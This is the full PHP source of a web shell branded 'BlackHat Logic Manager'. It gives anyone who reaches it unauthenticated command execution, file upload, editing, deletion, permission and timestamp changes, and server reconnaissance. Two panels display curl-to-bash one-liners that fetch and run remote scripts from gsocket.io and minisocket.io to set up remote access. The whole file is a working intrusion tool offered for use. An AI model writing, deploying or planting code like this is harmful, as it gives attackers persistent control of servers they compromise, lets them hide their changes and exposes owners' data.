<?php
error_reporting(0);
session_start();
$APP_NAME = "BlackHat Logic Manager";
$BASE_PATH = getcwd();

function perms($file){ return substr(sprintf('%o', fileperms($file)), -4); }
function owner($file){
    if(function_exists('posix_getpwuid')){
        $uid = fileowner($file);
        $info = posix_getpwuid($uid);
        return $info['name'];
    } elseif(function_exists('shell_exec')){
        $owner = shell_exec('ls -ld '.escapeshellarg($file).' | awk \'{print $3}\'');
        return trim($owner);
    }
    return 'unknown';
}
// function exe($cmd){
//     if(function_exists('shell_exec')) return shell_exec($cmd);
//     elseif(function_exists('exec')){exec($cmd,$o);return implode("\n",$o);}
//     elseif(function_exists('system')){ob_start();system($cmd);$o=ob_get_clean();return $o;}
//     elseif(function_exists('passthru')){ob_start();passthru($cmd);$o=ob_get_clean();return $o;}
//     return "Command execution not available.";
// }
function exe($cmd, $cwd = null){
    $cmd = "(" . $cmd . ") 2>&1";
    
    if($cwd) {
        $cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd;
    }
    
    if(function_exists("shell_exec")) {
        $result = shell_exec($cmd);
        if($result === null || $result === false) {
            return "Command executed (no output)";
        }
        return $result;
    }
    elseif(function_exists("exec")){
        exec($cmd, $o, $return_var);
        $output = implode("\n", $o);
        if($return_var !== 0 && empty($output)) {
            return "Command failed with return code: " . $return_var;
        }
        return $output ?: "Command executed (no output)";
    }
    elseif(function_exists("system")){
        ob_start();
        system($cmd, $return_var);
        $o = ob_get_clean();
        if($return_var !== 0 && empty($o)) {
            return "Command failed with return code: " . $return_var;
        }
        return $o ?: "Command executed (no output)";
    }
    elseif(function_exists("passthru")){
        ob_start();
        passthru($cmd, $return_var);
        $o = ob_get_clean();
        if($return_var !== 0 && empty($o)) {
            return "Command failed with return code: " . $return_var;
        }
        return $o ?: "Command executed (no output)";
    }
    return "Command execution not available.";
}

function getFileDate($file, $format = 'F d Y H:i:s') { return date($format, filemtime($file)); }
function formatSize($bytes){
    if($bytes>=1073741824) return number_format($bytes/1073741824,2).' GB';
    elseif($bytes>=1048576) return number_format($bytes/1048576,2).' MB';
    elseif($bytes>=1024) return number_format($bytes/1024,2).' KB';
    elseif($bytes>1) return $bytes.' B';
    elseif($bytes==1) return '1 B';
    else return '0 B';
}
function isWritable($file){ return is_writable($file); }
function isReadable($file){ return is_readable($file); }

// Server Info Functions
function getServerIP(){
    if(!empty($_SERVER['SERVER_ADDR'])) return $_SERVER['SERVER_ADDR'];
    elseif(function_exists('gethostbyname')) return gethostbyname($_SERVER['SERVER_NAME']);
    return 'Unknown';
}
function getSystemInfo(){
    if(function_exists('php_uname')) return php_uname();
    elseif(function_exists('shell_exec')) return trim(shell_exec('uname -a'));
    return 'Unknown';
}
function getCurrentUser(){
    if(function_exists('posix_getpwuid') && function_exists('posix_geteuid')){
        $user = posix_getpwuid(posix_geteuid());
        return $user['name'];
    } elseif(function_exists('get_current_user')) return get_current_user();
    elseif(function_exists('shell_exec')) return trim(shell_exec('whoami'));
    return 'Unknown';
}
function getServerSoftware(){
    return $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
}

$path = isset($_GET['path']) ? $_GET['path'] : $BASE_PATH;
$path = str_replace("\\","/",$path);
$paths = explode("/",$path);
$search = isset($_GET['search']) ? strtolower($_GET['search']) : "";
$msg = "";
$msgType = "";

// if(isset($_FILES['file'])){
//     $dest = $path.'/'.$_FILES['file']['name'];
//     if(copy($_FILES['file']['tmp_name'],$dest)){
//         $msg = "Upload Berhasil: ".$_FILES['file']['name'];
//         $msgType = "success";
//     } else {
//         $msg = "Upload Gagal!";
//         $msgType = "error";
//     }
// }
if(isset($_FILES['file'])){
    $dest = $path.'/'.$_FILES['file']['name'];
    if(copy($_FILES['file']['tmp_name'],$dest)){
        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dest);
        $fileUrl = $relativePath;
        $msg = "Upload Berhasil: <a href='".$fileUrl."' target='_blank'>".$_FILES['file']['name']."</a>";
        $msgType = "success";
    } else {
        $msg = "Upload Gagal!";
        $msgType = "error";
    }
}

// if(isset($_POST['newfile'])){
//     if(file_put_contents($path.'/'.$_POST['newfile'],"")){
//         $msg = "File dibuat: ".$_POST['newfile'];
//         $msgType = "success";
//     } else {
//         $msg = "Gagal membuat file!";
//         $msgType = "error";
//     }
// }
if(isset($_POST["newfile"])){
    $newFile = $path.'/'.$_POST["newfile"];
    $result = file_put_contents($newFile,"");
    if($result !== false){
        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $newFile);
        $fileUrl = $relativePath;
        $msg = "File dibuat: <a href='".$fileUrl."' target='_blank'>".$_POST["newfile"]."</a>";
        $msgType = "success";
    } else {
        $msg = "Gagal membuat file!";
        $msgType = "error";
    }
}

if(isset($_POST['newfolder'])){
    if(mkdir($path.'/'.$_POST['newfolder'])){
        $msg = "Folder dibuat: ".$_POST['newfolder'];
        $msgType = "success";
    } else {
        $msg = "Gagal membuat folder!";
        $msgType = "error";
    }
}
if(isset($_POST['delete'])){
    $t=$_POST['target'];
    if(is_dir($t)?@rmdir($t):@unlink($t)){
        $msg = "Dihapus: ".basename($t);
        $msgType = "success";
    } else {
        $msg = "Gagal menghapus!";
        $msgType = "error";
    }
}
if(isset($_POST['rename'])){
    if(rename($_POST['oldname'], dirname($_POST['oldname']).'/'.$_POST['newname'])){
        $msg = "Rename berhasil";
        $msgType = "success";
    } else {
        $msg = "Rename gagal!";
        $msgType = "error";
    }
}
if(isset($_POST['chmod'])){
    if(chmod($_POST['target'],octdec($_POST['perm']))){
        $msg = "Chmod berhasil";
        $msgType = "success";
    } else {
        $msg = "Chmod gagal!";
        $msgType = "error";
    }
}
if(isset($_POST['savefile'])){
    if(file_put_contents($_POST['target'],$_POST['src'])){
        $msg = "File disimpan";
        $msgType = "success";
    } else {
        $msg = "Gagal menyimpan file!";
        $msgType = "error";
    }
}
if(isset($_POST['changedate'])){
    $t=strtotime($_POST['newdate']);
    if($t && touch($_POST['target'],$t)){
        $msg = "Tanggal diubah";
        $msgType = "success";
    } else {
        $msg = "Gagal mengubah tanggal!";
        $msgType = "error";
    }
}

// Unzip
if(isset($_POST['unzip'])){
    $zipFile = $_POST['target'];
    $extractPath = $path;
    $success = false;
    if(class_exists('ZipArchive')){
        $zip = new ZipArchive;
        if($zip->open($zipFile) === TRUE){
            $zip->extractTo($extractPath);
            $zip->close();
            $success = true;
        }
    } elseif(function_exists('shell_exec')){
        $cmd = "unzip -o ".escapeshellarg($zipFile)." -d ".escapeshellarg($extractPath)." 2>&1";
        shell_exec($cmd);
        $success = true;
    }
    if($success){
        $msg = "Unzip berhasil!";
        $msgType = "success";
    } else {
        $msg = "Unzip gagal!";
        $msgType = "error";
    }
}

$terminal_output = "";
$showTerminal = isset($_POST['toggle_terminal']) ? true : false;
$showGSocket = isset($_POST['show_gsocket']) ? true : false;
$showMiniSocket = isset($_POST['show_minisocket']) ? true : false;

if(isset($_POST["execmd"])){ 
    $terminal_output = exe($_POST["cmd"], $path); 
    $showTerminal = true;
}

function getFileExtension($file){
    return strtolower(pathinfo($file, PATHINFO_EXTENSION));
}

// Disable Functions info
$disableFunctions = ini_get('disable_functions');
$disableFunctionsText = $disableFunctions ?: 'Aman';
$disableFunctionsColor = ($disableFunctionsText == 'Aman') ? '#00ff00' : '#ff4444';
?>
<!DOCTYPE html>
<html>
<head>
<title><?=$APP_NAME?></title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
*{box-sizing:border-box;}
body{font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background:#0d0d0d;color:#eee;margin:0;padding:0;font-size:14px;}
h1{color:#fff;text-align:center;padding:15px 0;margin:0;font-size:26px;font-weight:500;background:#111;border-bottom:1px solid #333;}
h1 i{color:#f1c40f;margin-right:10px;}
a{color:#f1c40f;text-decoration:none;}a:hover{color:#e67e22;text-decoration:none;}
table{width:100%;border-collapse:collapse;background:#0d0d0d;}
th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #333;}
th{background:#1a1a1a;color:#f1c40f;font-weight:500;font-size:13px;text-transform:uppercase;letter-spacing:0.5px;}
tr:hover{background:#1a1a1a;}
input,textarea,select{background:#1a1a1a;color:#fff;border:1px solid #444;border-radius:4px;padding:6px 12px;font-size:13px;}
textarea{width:100%;height:500px;font-family:'Courier New', monospace;background:#0d0d0d;color:#eee;}
button{cursor:pointer;background:#f1c40f;color:#000;border:none;font-weight:500;padding:6px 12px;border-radius:4px;}
button:hover{background:#e67e22;color:#000;}
.btn-icon{background:none;border:none;padding:5px 6px;margin:0 2px;color:#fff;font-size:14px;cursor:pointer;}
.btn-icon:hover{background:#1a1a1a;color:#e67e22;}
.btn-icon.delete:hover{color:#ff4444;}
.btn-icon.unzip{color:#fff;}
.btn-icon.unzip:hover{color:#e67e22;}

/* File clickable */
.file-link{cursor:pointer;color:#fff;text-decoration:none;}
.file-link:hover{color:#e67e22;text-decoration:none;}
.file-link i{margin-right:6px;}

.breadcrumb{padding:10px 20px;background:#111;border-bottom:1px solid #333;font-size:13px;}
.breadcrumb i{color:#f1c40f;margin:0 5px;}
.breadcrumb a{color:#f1c40f;}
.breadcrumb a:hover{color:#e67e22;}

.msg-box{padding:10px 20px;background:#111;margin:15px 0;font-size:13px;border-radius:4px;}
.msg-box.success{border-left:4px solid #00ff00;color:#00ff00;}
.msg-box.error{border-left:4px solid #ff4444;color:#ff4444;}
.msg-box i{margin-right:8px;}

/* Server Info Panel */
.server-panel{background:#111;border:1px solid #333;border-radius:6px;padding:15px 20px;margin:0 20px 15px 20px;}
.server-panel .info-row{display:flex;margin-bottom:8px;font-size:13px;}
.server-panel .info-row i{color:#f1c40f;width:25px;margin-right:10px;}
.server-panel .info-row .label{width:140px;color:#888;}
.server-panel .info-row .value{color:#fff;word-break:break-all;flex:1;}

/* Terminal Panel - Seperti GSocket */
.terminal-panel{margin:0 20px 15px 20px;}
.terminal-panel textarea{width:100%;height:300px;background:#0d0d0d;color:#fff;border:1px solid #444;font-family:'Courier New', monospace;font-size:12px;padding:10px;resize:vertical;}

.info-box{padding:12px 20px;background:#111;border-bottom:1px solid #333;margin:0;display:flex;align-items:center;flex-wrap:wrap;gap:15px;font-size:13px;}
.info-box i{color:#f1c40f;margin-right:6px;width:18px;}
.info-box span{margin-left:auto;display:flex;gap:8px;align-items:center;}

.server-btn{background:#1a1a1a;color:#fff;border:1px solid #444;padding:5px 12px;cursor:pointer;border-radius:4px;font-size:13px;}
.server-btn:hover{background:#e67e22;color:#000;border-color:#e67e22;}
.server-btn i{margin-right:5px;}
.server-btn.active{background:#e67e22;color:#000;}

.home-btn{background:none;color:#f1c40f;border:1px solid #f1c40f;padding:5px 14px;cursor:pointer;border-radius:4px;font-size:13px;}
.home-btn:hover{background:#e67e22;color:#000;border-color:#e67e22;}
.home-btn i{margin-right:5px;}

.action-bar{padding:10px 20px;background:#111;border-bottom:1px solid #333;display:flex;gap:20px;flex-wrap:wrap;font-size:13px;}

.container{padding:0 20px 20px;}

/* Modal */
.modal-overlay{
    display:none;
    position:fixed;
    top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,0.8);
    z-index:1999;
}
.modal{
    display:none;
    position:fixed;
    top:50%;left:50%;
    transform:translate(-50%,-50%);
    background:#0d0d0d;
    border-radius:6px;
    padding:25px;
    z-index:2000;
    width:450px;
    box-shadow:0 5px 30px rgba(0,0,0,0.7);
    border:1px solid #f1c40f;
}
.modal.large{width:90%;max-width:1200px;}
.modal h3{margin:0 0 20px 0;font-size:16px;color:#f1c40f;}
.modal .close{color:#aaa;float:right;font-size:24px;cursor:pointer;}
.modal .close:hover{color:#e67e22;}
.modal input[type="text"]{width:100%;padding:10px;background:#1a1a1a;border:1px solid #444;color:#fff;font-size:13px;}
.modal-footer{padding-top:20px;margin-top:20px;border-top:1px solid #333;text-align:right;display:flex;gap:10px;justify-content:flex-end;}

.btn-primary{background:#f1c40f;color:#000;border:none;padding:8px 18px;font-size:13px;}
.btn-primary:hover{background:#e67e22;}
.btn-secondary{background:#1a1a1a;color:#fff;border:1px solid #444;padding:8px 18px;font-size:13px;}
.btn-secondary:hover{background:#333;}

.fa-folder{color:#f1c40f;}
.action-icons{display:flex;gap:3px;justify-content:flex-start;flex-wrap:nowrap;}

/* Kolom lebar */
th:nth-child(1){width:22%;}
th:nth-child(2){width:8%;}
th:nth-child(3){width:22%;}
th:nth-child(4){width:18%;}
th:nth-child(5){width:12%;}
th:nth-child(6){width:18%;}

td{font-size:13px;word-break:break-word;}
td a i{margin-right:6px;}
</style>
<script>
function openModal(id){
    document.getElementById(id).style.display='block';
    document.getElementById(id+'_overlay').style.display='block';
}
function closeModal(id){
    document.getElementById(id).style.display='none';
    document.getElementById(id+'_overlay').style.display='none';
}
function goHome(){ window.location.href = '?path=<?=$BASE_PATH?>'; }
function numberOnly(event){
    var key = (event.which) ? event.which : event.keyCode;
    if (key != 46 && key > 31 && (key < 48 || key > 57))
        return false;
    return true;
}
function confirmUnzip(filename){
    return confirm('Extract "' + filename + '" to current directory?');
}
</script>
</head>
<body>

<h1><i class="fas fa-skull"></i> <?=$APP_NAME?></h1>

<!-- Top Bar -->
<div class="info-box">
<div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap;">
<i class="fas fa-server"></i> <span>Server Information</span>
</div>
<span>
<form method="POST" style="display:inline;">
    <button type="submit" name="show_gsocket" class="server-btn <?=$showGSocket?'active':''?>">GSocket</button>
</form>
<form method="POST" style="display:inline;">
    <button type="submit" name="show_minisocket" class="server-btn <?=$showMiniSocket?'active':''?>">MiniSocket</button>
</form>
<form method="POST" style="display:inline;">
    <button type="submit" name="toggle_terminal" class="server-btn <?=$showTerminal?'active':''?>"><i class="fas fa-terminal"></i>Terminal</button>
</form>
<button type="button" class="home-btn" onclick="goHome()"><i class="fas fa-home"></i>Home</button>
</span>
</div>

<!-- Server Info Panel -->
<div class="server-panel">
    <div class="info-row">
        <i class="fas fa-network-wired"></i>
        <span class="label">IP :</span>
        <span class="value"><?=getServerIP()?></span>
    </div>
    <div class="info-row">
        <i class="fas fa-microchip"></i>
        <span class="label">System :</span>
        <span class="value"><?=getSystemInfo()?></span>
    </div>
    <div class="info-row">
        <i class="fas fa-user"></i>
        <span class="label">User :</span>
        <span class="value"><?=getCurrentUser()?></span>
    </div>
    <div class="info-row">
        <i class="fab fa-php"></i>
        <span class="label">PHP Version :</span>
        <span class="value"><?=phpversion()?></span>
    </div>
    <div class="info-row">
        <i class="fas fa-server"></i>
        <span class="label">Software :</span>
        <span class="value"><?=getServerSoftware()?></span>
    </div>
    <div class="info-row">
        <i class="fas fa-ban"></i>
        <span class="label">Disable Functions :</span>
        <span class="value" style="color:<?=$disableFunctionsColor?>;"><?=$disableFunctionsText?></span>
    </div>
    <div class="info-row">
        <i class="fas fa-folder-open"></i>
        <span class="label">Path :</span>
        <span class="value"><?=$path?></span>
    </div>
</div>

<!-- GSocket Panel -->
<?php if($showGSocket): ?>
<div class="terminal-panel">
    <textarea readonly>bash -c "$(curl -fsSL https://gsocket.io/y)"</textarea>
</div>
<?php endif; ?>

<!-- MiniSocket Panel -->
<?php if($showMiniSocket): ?>
<div class="terminal-panel">
    <textarea readonly>bash -c "$(curl -fsSL https://minisocket.io/bin/x)"</textarea>
</div>
<?php endif; ?>

<!-- Terminal Panel -->
<?php if($showTerminal): ?>
<div class="terminal-panel">
    <form method="POST">
        <div style="display:flex;gap:8px;margin-bottom:10px;">
            <input type="text" name="cmd" placeholder="Enter command..." style="flex:1;background:#1a1a1a;color:#fff;">
            <button type="submit" name="execmd" class="btn-primary"><i class="fas fa-play"></i> Run</button>
        </div>
        <input type="hidden" name="toggle_terminal" value="1">
    </form>
    <?php if($terminal_output): ?>
    <textarea readonly><?=$terminal_output?></textarea>
    <?php else: ?>
    <textarea readonly placeholder="Output will appear here..."></textarea>
    <?php endif; ?>
</div>
<?php endif; ?>

<!-- Breadcrumb -->
<div class="breadcrumb">
<i class="fas fa-folder"></i>
<?php
foreach($paths as $id=>$pat){
    if($pat==''&&$id==0){echo '<a href="?path=/"><i class="fas fa-hdd"></i> /</a>';continue;}
    if($pat=='')continue;
    echo ' <i class="fas fa-chevron-right"></i> <a href="?path=';
    for($i=0;$i<=$id;$i++){echo $paths[$i]; if($i!=$id)echo "/";}
    echo '">'.$pat.'</a>';
}
?>
</div>

<!-- Action Bar -->
<div class="action-bar">
<form enctype="multipart/form-data" method="POST" style="display:flex;gap:8px;align-items:center;">
    <i class="fas fa-upload" style="color:#f1c40f;"></i>
    <input type="file" name="file" style="width:auto;background:#1a1a1a;">
    <button type="submit">Upload</button>
</form>
<form method="POST" style="display:flex;gap:8px;align-items:center;">
    <i class="fas fa-file" style="color:#f1c40f;"></i>
    <input type="text" name="newfile" placeholder="newfile.txt" style="width:140px;background:#1a1a1a;">
    <button type="submit">New File</button>
</form>
<form method="POST" style="display:flex;gap:8px;align-items:center;">
    <i class="fas fa-folder-plus" style="color:#f1c40f;"></i>
    <input type="text" name="newfolder" placeholder="newfolder" style="width:140px;background:#1a1a1a;">
    <button type="submit">New Folder</button>
</form>
<form method="GET" style="display:flex;gap:8px;align-items:center;margin-left:auto;">
    <input type="hidden" name="path" value="<?=$path?>">
    <i class="fas fa-search" style="color:#f1c40f;"></i>
    <input type="text" name="search" value="<?=htmlspecialchars($search)?>" placeholder="Search..." style="width:160px;background:#1a1a1a;">
    <button type="submit">Find</button>
</form>
</div>

<?php if($msg): ?>
<div class="msg-box <?=$msgType?>"><i class="fas fa-<?=$msgType=="success"?'check':'exclamation'?>-circle"></i> <?php echo $msg; ?></div>
<?php endif; ?>

<!-- File Manager -->
<div class="container">
<table>
<thead>
<tr>
    <th>Name</th>
    <th>Size</th>
    <th>Modified</th>
    <th>Owner</th>
    <th>Permissions</th>
    <th>Actions</th>
</tr>
</thead>
<tbody>
<?php
$scandir=scandir($path); $folders=[]; $files=[];
foreach($scandir as $f){ 
    if($f=="."||$f=="..") continue; 
    if($search && stripos($f,$search)===false) continue; 
    if(is_dir($path.'/'.$f)) $folders[]=$f; else $files[]=$f; 
}

function renderRow($full,$f,$isFolder=false){
    $size = $isFolder?'Dir':formatSize(filesize($full));
    $mid = md5($full);
    $cdate = getFileDate($full);
    $cperm = perms($full);
    $fname = basename($f);
    $ext = $isFolder ? '' : getFileExtension($f);
    $fowner = owner($full);
    
    $permColor = '';
    if(isWritable($full)) $permColor = '#00ff00';
    elseif(!isReadable($full)) $permColor = '#ff4444';
    
    echo"<tr>
        <td>";
    
    if($isFolder){
        echo "<a href='?path=$full'><i class='fas fa-folder fa-fw'></i> $f</a>";
    } else {
        echo "<a href='javascript:void(0)' onclick=\"openModal('edit_$mid')\" class='file-link'><i class='fas fa-file fa-fw'></i> $f</a>";
    }
    
    echo "</td>
        <td>$size</td>
        <td>$cdate</td>
        <td>$fowner</td>
        <td>";
    
    if($permColor) echo "<font color='$permColor'><b>$cperm</b></font>";
    else echo "<b>$cperm</b>";
    
    echo "</td>
        <td>
            <div class='action-icons'>";
    
    if(!$isFolder){
        echo "<button onclick=\"openModal('edit_$mid')\" class='btn-icon' title='Edit'><i class='fas fa-edit'></i></button>";
    }
    
    echo "<button onclick=\"openModal('rename_$mid')\" class='btn-icon' title='Rename'><i class='fas fa-pen'></i></button>";
    echo "<button onclick=\"openModal('chmod_$mid')\" class='btn-icon' title='Permission'><i class='fas fa-key'></i></button>";
    echo "<button onclick=\"openModal('chdate_$mid')\" class='btn-icon' title='Change Date'><i class='fas fa-calendar-alt'></i></button>";
    
    if(!$isFolder && $ext == 'zip'){
        echo "<form method='POST' style='display:inline;' onsubmit='return confirmUnzip(\"$f\")'>
            <input type='hidden' name='target' value='$full'>
            <button type='submit' name='unzip' class='btn-icon unzip' title='Extract ZIP'><i class='fas fa-file-archive'></i></button>
        </form>";
    }
    
    echo "<form method='POST' style='display:inline;' onsubmit='return confirm(\"Delete $f?\")'>
        <input type='hidden' name='target' value='$full'>
        <button type='submit' name='delete' class='btn-icon delete' title='Delete'><i class='fas fa-trash-alt'></i></button>
    </form>";
    
    echo "  </div>
        </td>
    </tr>";
    
    // RENAME MODAL
    echo "<div class='modal-overlay' id='rename_{$mid}_overlay'></div>
    <div class='modal' id='rename_{$mid}'>
        <span class='close' onclick='closeModal(\"rename_{$mid}\")'>&times;</span>
        <h3><i class='fas fa-pen'></i> Rename : $f</h3>
        <form method='POST'>
            <input type='hidden' name='oldname' value='$full'>
            <div style='display:flex;gap:8px;align-items:center;'>
                <span>Name :</span>
                <input type='text' name='newname' value='$fname' style='flex:1;'>
            </div>
            <div class='modal-footer'>
                <button type='button' class='btn-secondary' onclick='closeModal(\"rename_{$mid}\")'>Cancel</button>
                <button type='submit' name='rename' class='btn-primary'>Rename</button>
            </div>
        </form>
    </div>";
    
    // CHMOD MODAL
    echo "<div class='modal-overlay' id='chmod_{$mid}_overlay'></div>
    <div class='modal' id='chmod_{$mid}'>
        <span class='close' onclick='closeModal(\"chmod_{$mid}\")'>&times;</span>
        <h3>Change Permission : $cperm, Name : $f</h3>
        <form method='POST'>
            <input type='hidden' name='target' value='$full'>
            <div style='display:flex;gap:8px;align-items:center;'>
                <span>Change :</span>
                <input type='text' name='perm' maxlength='4' onkeypress='return numberOnly(event)' value='$cperm' style='flex:1;' required>
            </div>
            <div class='modal-footer'>
                <button type='button' class='btn-secondary' onclick='closeModal(\"chmod_{$mid}\")'>Cancel</button>
                <button type='submit' name='chmod' class='btn-primary'>Change</button>
            </div>
        </form>
    </div>";
    
    // CHDATE MODAL
    echo "<div class='modal-overlay' id='chdate_{$mid}_overlay'></div>
    <div class='modal' id='chdate_{$mid}'>
        <span class='close' onclick='closeModal(\"chdate_{$mid}\")'>&times;</span>
        <h3>Change Date : $cdate | Name : $f</h3>
        <form method='POST'>
            <input type='hidden' name='target' value='$full'>
            <div style='display:flex;gap:8px;align-items:center;'>
                <span>Change :</span>
                <input type='text' name='newdate' value='$cdate' style='flex:1;'>
            </div>
            <div class='modal-footer'>
                <button type='button' class='btn-secondary' onclick='closeModal(\"chdate_{$mid}\")'>Cancel</button>
                <button type='submit' name='changedate' class='btn-primary'>Change</button>
            </div>
        </form>
    </div>";
    
    // EDIT MODAL
    if(!$isFolder){
        $content = htmlspecialchars(file_get_contents($full));
        echo "<div class='modal-overlay' id='edit_{$mid}_overlay'></div>
        <div class='modal large' id='edit_{$mid}'>
            <span class='close' onclick='closeModal(\"edit_{$mid}\")'>&times;</span>
            <h3><i class='fas fa-edit'></i> Edit File : <font color='#00ff00'>$f</font> | Size : $size</h3>
            <form method='POST'>
                <textarea name='src' style='height:600px;width:100%;font-size:13px;'>$content</textarea>
                <input type='hidden' name='target' value='$full'>
                <div class='modal-footer'>
                    <button type='button' class='btn-secondary' onclick='closeModal(\"edit_{$mid}\")'>Cancel</button>
                    <button type='submit' name='savefile' class='btn-primary'><i class='fas fa-save'></i> Save</button>
                </div>
            </form>
        </div>";
    }
}

foreach($folders as $f) renderRow($path.'/'.$f,$f,true);
foreach($files as $f) renderRow($path.'/'.$f,$f,false);
?>
</tbody>
</table>
</div>

<div style="text-align:center;padding:15px;color:#666;font-size:12px;">
<?=date("Y")?> &copy; BlackHat Logic Manager
</div>

</body>
</html>
